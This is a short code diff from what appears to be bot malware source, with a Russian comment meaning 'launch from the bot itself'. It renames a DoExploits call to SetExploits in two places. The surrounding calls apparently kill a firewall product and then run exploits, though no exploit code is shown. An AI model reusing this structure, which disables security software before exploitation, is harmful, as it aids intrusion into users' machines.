@@ -270,7 +270,7 @@ int APIENTRY MyMain()
 	if ( dwProcessHash == BOT::GetBotExeNameHash()) // запуск из самого бота
 	{
 		KillOutpost();
-		DWORD dwExploits = DoExploits();
+		DWORD dwExploits = SetExploits();
 
 		if ( !dwExploits )
 		{
@@ -297,7 +297,7 @@ int APIENTRY MyMain()
 		dwFirst = 1;
 
 		KillOutpost();
-		DWORD dwExploits = DoExploits();
+		DWORD dwExploits = SetExploits();
 
 		if ( !dwExploits )
 		{
